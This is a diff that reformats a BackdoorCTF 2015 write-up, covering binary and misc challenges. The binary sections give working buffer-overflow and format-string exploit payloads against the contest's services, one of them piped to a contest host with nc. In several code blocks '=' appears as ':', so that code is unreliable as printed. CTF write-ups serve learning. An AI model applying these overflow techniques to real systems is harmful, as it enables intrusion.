@@ -1,28 +1,34 @@
 ---
 type: ctf
-title : BackdoorCTF 2015 - Binary + Misc
+title: BackdoorCTF 2015 - Binary + Misc
 tags: [BackdoorCT, Binary, Misc]
-date : 2015-05-07
+date: 2015-05-07
 author: Eno
 featuredImage: https://shankaraman.files.wordpress.com/2015/04/backdoor.png
 ---
 
 [BackdoorCTF 2015](https://backdoor.sdslabs.co/)  
-For me, this is a challenge for CTF beginners. Most of the challenges are easy to solve, although some of them require some **"imagination"**...  
+For me, this is a challenge for CTF beginners. Most of the challenges are easy to solve, although some of them require
+some **"imagination"**...
 
-In this writeup, I'll post the solutions of all the binary challenges and the misc challenges that I solved in the CTF.  
+In this writeup, I'll post the solutions of all the binary challenges and the misc challenges that I solved in the CTF.
 
 # Binary
+
 ## echo
-Basic BOF. Launch IDA Pro and we can see there's a gets() function in the main function. Just overwrite the return address to control the `eip` jump to the `sample()` function, which cat the flag.  
-payload: `python -c 'print "A"*62+"\x4d\x85\x04\x08"' | nc hack.bckdr.in 8002`  
+
+Basic BOF. Launch IDA Pro and we can see there's a gets() function in the main function. Just overwrite the return
+address to control the `eip` jump to the `sample()` function, which cat the flag.  
+payload: `python -c 'print "A"*62+"\x4d\x85\x04\x08"' | nc hack.bckdr.in 8002`
 
 ## team
+
 Basic format string. To be honest I don't think this challenge worth 600 pt...  
-The flag's on the stack. Just leak it with the format string vulnerability, wrote a script concat the string and bang, CTF  
+The flag's on the stack. Just leak it with the format string vulnerability, wrote a script concat the string and bang,
+CTF  
 payload: `%10$p.%11$p.%12$p.........%25$p`
 
-``` python
+```python
 temp : [35663364,64363031,................................]
 flag : ""
 for c in temp:
@@ -31,10 +37,12 @@ print "flag:", flag
 ```
 
 ## forgot
-Another binary with the BOF vulnerability. It's a service that ask user to input their name and email address, and check the email address is whether a validate email address or not. 
-Inspect the binary with IDA Pro, we found the following line has the BOF vulnerability:
-`__isoc99_scanf("%s", &v11); // v11 : [bp-0x74]`
-Moreover, there's a for loop with a switch-case in it to check the email address:
+
+Another binary with the BOF vulnerability. It's a service that ask user to input their name and email address, and check
+the email address is whether a validate email address or not. Inspect the binary with IDA Pro, we found the following
+line has the BOF vulnerability: `__isoc99_scanf("%s", &v11); // v11 : [bp-0x74]` Moreover, there's a for loop with a
+switch-case in it to check the email address:
+
 ```c
 for ( i : 0; ; ++i )  {
     v9 : i;
@@ -47,9 +55,13 @@ for ( i : 0; ; ++i )  {
     }
 }
 ```
-To bypass the email address validation is simple, we just insert null byte in the beginning of the input, the `strlen()` will consider the string's length is 0 and stop the checking.  
 
-I try to overwrite the return address first, which cause the program crash. So I switch to the IDA view and check the assembly, here's what I found:
+To bypass the email address validation is simple, we just insert null byte in the beginning of the input, the `strlen()`
+will consider the string's length is 0 and stop the checking.
+
+I try to overwrite the return address first, which cause the program crash. So I switch to the IDA view and check the
+assembly, here's what I found:
+
 ```
 .text:08048A58                 sub     dword ptr [esp+78h], 1
 .text:08048A5D                 mov     eax, [esp+78h]
@@ -57,7 +69,10 @@ I try to overwrite the return address first, which cause the program crash. So I
 .text:08048A65                 call    eax
 ```
 
-So apparently before the main function end, it does something really interesting. The program took a value that store on the stack, do some calculation, and store it in the eax before calling it. If we can make the value that store at `[esp+78h]` 0, we can call whatever we want by controling the value store at `[esp+30h]`. But who should we call? After checking the text view in IDA Pro, I found that there's one function that IDA Pro didn't decompile it into pseudo code.  
+So apparently before the main function end, it does something really interesting. The program took a value that store on
+the stack, do some calculation, and store it in the eax before calling it. If we can make the value that store at
+`[esp+78h]` 0, we can call whatever we want by controling the value store at `[esp+30h]`. But who should we call? After
+checking the text view in IDA Pro, I found that there's one function that IDA Pro didn't decompile it into pseudo code.
 
 ```
 .text:080486CC                 push    ebp
@@ -76,7 +91,8 @@ So apparently before the main function end, it does something really interesting
 .text:08048701                 retn
 ```
 
-So just overwrite the stack, make `eax` be calculated to `0x080486CC`, then we can get the flag by executing the `call eax` instruction. Here's the payload:
+So just overwrite the stack, make `eax` be calculated to `0x080486CC`, then we can get the flag by executing the
+`call eax` instruction. Here's the payload:
 
 ```python
 payload : "123\n" # name
@@ -88,8 +104,12 @@ payload += "\x01\x00\x00\x00" # esp+0x78
 ```
 
 # Misc
+
 ## TIM
-We got a github page, so it's seems like a git/forensic challenge. After cloning the repository and check the git log, we found some intereting stuff. 
+
+We got a github page, so it's seems like a git/forensic challenge. After cloning the repository and check the git log,
+we found some intereting stuff.
+
 ```
 commit d444f3227636477902c4badc8e35a27cadab456c
 Author: Abhay Rana <capt.n3m0@gmail.com>
@@ -102,8 +122,8 @@ Author: Abhay Rana <me@captnemo.in>
 Date:   Tue Mar 31 17:59:08 2015 +0530
 
     47
-    
-    
+
+
     - 1518
 
 commit 006d89cdd1a4ea3620bc6d4f865a2e341f5ee79a
@@ -111,8 +131,8 @@ Author: Abhay Rana <me@captnemo.in>
 Date:   Tue Mar 31 17:59:08 2015 +0530
 
     41
-    
-    
+
+
     - 1527
 
 commit 00df98e1685e093c643657c6b68d31b9948927aa
@@ -120,13 +140,16 @@ Author: Abhay Rana <me@captnemo.in>
 Date:   Tue Mar 31 17:59:08 2015 +0530
 
     4c
-    
-........................    
+
+........................
 ```
 
-It's seems like they convert some characters' ASCII code into hex values and committed it. After converting them back to the normal character, we got the following message:  
+It's seems like they convert some characters' ASCII code into hex values and committed it. After converting them back to
+the normal character, we got the following message:  
 `Join first two characters of each commit sha1 FLAG`  
-OK, so just do whatever it says, wrote a python script extract each commit sha1's first 2 characters and concat them, we'll get the flag. Notice that if the first 2 characters are "00", just ignore them.  
+OK, so just do whatever it says, wrote a python script extract each commit sha1's first 2 characters and concat them,
+we'll get the flag. Notice that if the first 2 characters are "00", just ignore them.
+
 ```python
 ff : open("log", "r")
 flag : []
@@ -139,7 +162,15 @@ print "".join(c for c in reversed(flag))
 ```
 
 ## QR
-It's a service that gave us a bunch of QR codes, which require us to decode them & send the answers back to the server. The QR codes are generate randomly, so we'll have to write a script to solve them all. For me, I wrote a python script to parse the input into a 2D-array, and use the [Pillow](https://pillow.readthedocs.org/) library to transform the input into a png image, which contains the QR code. At first I try to use some python libraries to decode the QR code, including qrtools & zbar. Unfortunately, both of them weren't very effective, the correctness are kind of awful...so I finally decide to send the file to [ZXing](http://zxing.org/w/decode.jspx) and parse the response. This time, no error occurs. I finally got the flag after solving 100 QR codes.
+
+It's a service that gave us a bunch of QR codes, which require us to decode them & send the answers back to the server.
+The QR codes are generate randomly, so we'll have to write a script to solve them all. For me, I wrote a python script
+to parse the input into a 2D-array, and use the [Pillow](https://pillow.readthedocs.org/) library to transform the input
+into a png image, which contains the QR code. At first I try to use some python libraries to decode the QR code,
+including qrtools & zbar. Unfortunately, both of them weren't very effective, the correctness are kind of awful...so I
+finally decide to send the file to [ZXing](http://zxing.org/w/decode.jspx) and parse the response. This time, no error
+occurs. I finally got the flag after solving 100 QR codes.
+
 ```python
 from socket import *
 from PIL import Image
@@ -166,7 +197,7 @@ def transform(array):
 	for y in range(height):
 		for x in range(width):
 			im.putpixel((x,y), pixels[y][x])
-	
+
 	width, height : width*5, height*10
 	im : im.resize((width, height))
 
@@ -211,7 +242,7 @@ while True:
 
 	transform(array)
 	time.sleep(0.5)
-  
+
   	while True:
 	    answer : decode_qr()
       	print answer
@@ -225,44 +256,55 @@ sock.close()
 ```
 
 ## RapidFire
-Another service which give us a bunch of questions (**200** actually...) and ask us to solve all of them. The questions contains different categories, including:  
+
+Another service which give us a bunch of questions (**200** actually...) and ask us to solve all of them. The questions
+contains different categories, including:
 
 1. Math
-    - Nth prime
-    - Nth Fibonacci number
-    - Nth digit in Pi
-    - Sum of the first Nth natural numbers
-    - Sum of the first Nth odd numbers
-    - Sum of the first Nth Fibonacci numbers
-    - Value of N in binary
+   - Nth prime
+   - Nth Fibonacci number
+   - Nth digit in Pi
+   - Sum of the first Nth natural numbers
+   - Sum of the first Nth odd numbers
+   - Sum of the first Nth Fibonacci numbers
+   - Value of N in binary
 2. Geography
-    - Country of a city
-    - Alpha2-code of a country
+   - Country of a city
+   - Alpha2-code of a country
 3. Misc
-    - md5 hash
-    - Release year of a movie
+   - md5 hash
+   - Release year of a movie
 
 To solve all these problems, I use the follwing methods (in Ruby):
 
 1. Math
-    - Nth prime --> https://primes.utm.edu/nthprime/index.php
-    - Nth Fibonacci number --> just calculate it
-    - Nth digit in Pi --> http://www.eveandersson.com/pi/digits/1000000
-    - Sum of the first Nth natural numbers --> n(n+1)/2
-    - Sum of the first Nth odd numbers --> n^2
-    - Sum of the first Nth Fibonacci numbers --> fib(n+2)-1
-    - Value of N in binary --> n.to_s(2)
+   - Nth prime --> https://primes.utm.edu/nthprime/index.php
+   - Nth Fibonacci number --> just calculate it
+   - Nth digit in Pi --> http://www.eveandersson.com/pi/digits/1000000
+   - Sum of the first Nth natural numbers --> n(n+1)/2
+   - Sum of the first Nth odd numbers --> n^2
+   - Sum of the first Nth Fibonacci numbers --> fib(n+2)-1
+   - Value of N in binary --> n.to_s(2)
 2. Geography
-    - Country of a city --> http://maps.googleapis.com/maps/api/geocode/json
-    - Alpha2-code of a country --> wiki
+   - Country of a city --> http://maps.googleapis.com/maps/api/geocode/json
+   - Alpha2-code of a country --> wiki
 3. Misc
-    - md5 hash --> require ‘digest’
-    - Release year of a movie --> Rotten tomato API
-        
-Most of them are done by googling the solutions. I spent most of the time finding the solution for the last one -- **Release year of a movie**. This one almost drive me insane. I couldn't find a perfect solution for this kind of problem. It seems [IMDB](http://www.imdb.com/) has no public API for us to search the movie database, and the [Rotten Tomato API](http://developer.rottentomatoes.com/) sometimes return the wrong answer. Other movie database API are either too slow or just too crap to return the correct answers. At last I choose the Rotten Tomato API since there's no other solution. During solving this challenge, I found that sometimes I can made it to level 19X, while failing because of the wrong release year of the movie. So I finally decide to use the following command to run the script until I pass level 200:
+   - md5 hash --> require ‘digest’
+   - Release year of a movie --> Rotten tomato API
+
+Most of them are done by googling the solutions. I spent most of the time finding the solution for the last one --
+**Release year of a movie**. This one almost drive me insane. I couldn't find a perfect solution for this kind of
+problem. It seems [IMDB](http://www.imdb.com/) has no public API for us to search the movie database, and the
+[Rotten Tomato API](http://developer.rottentomatoes.com/) sometimes return the wrong answer. Other movie database API
+are either too slow or just too crap to return the correct answers. At last I choose the Rotten Tomato API since there's
+no other solution. During solving this challenge, I found that sometimes I can made it to level 19X, while failing
+because of the wrong release year of the movie. So I finally decide to use the following command to run the script until
+I pass level 200:
+
 ```bash
 while true; do ruby rapidfire.rb; done
 ```
+
 Yeah take that rapidfire =.=  
 **And guess what? I got the flag just before the end of the CTF !!! How lucky!!!**
 
@@ -303,10 +345,10 @@ def solve_fib(n)
 	curr_num, next_num : 0, 1
 	(n).times do
 	   	curr_num, next_num : next_num, curr_num + next_num
-	end  
+	end
 	p curr_num
 	curr_num
-end 
+end
 
 def get_country(city)
 	city : city.strip()
@@ -376,7 +418,7 @@ def get_country(city)
 			return c["long_name"].to_s
 		end
 	end
-end	
+end
 
 def get_movie_year(movie)
 	if movie.strip() == "28 Days Later..."
@@ -435,7 +477,7 @@ def get_movie_year(movie)
 	res : Net::HTTP.get_response(uri)
 	a : JSON.parse(res.body)
 	return a["movies"][0]["year"].to_s
-end	
+end
 
 def get_country_code(c)
 	if c == "Brazil"
@@ -513,10 +555,10 @@ def get_country_code(c)
 	for country in $db
 		name : country['Name'].encode('utf-8')
 		if name == c
-			return country['Code']  
+			return country['Code']
 		end
 	end
-end	
+end
 
 def get_pi(n)
 	row, col : n / 50, n % 50
@@ -537,19 +579,19 @@ def sum_n(n)
 	ret : n*(n+1)/2
 	p ret
 	ret
-end	
+end
 
 def get_binary(n)
 	ret : n*(n+1)/2
 	p ret
 	ret
-end	
+end
 
 def cal_md5(n)
 	md5 : Digest::MD5.new
 	md5.update n.to_s
-	p md5.hexdigest  
-	md5.hexdigest  
+	p md5.hexdigest
+	md5.hexdigest
 end
 
 def sum_odd(n)
@@ -701,11 +743,12 @@ while true
 		answer : get_movie_year(n)
 		p "answer:"+answer.to_s
 		sock.write answer.to_s+"\n"
-	else 
+	else
 	end
 end
-puts sock.recv(1024)	
+puts sock.recv(1024)
 sock.close
 
 ```
+
 500 points for solving this challenge! Woo-hoo!
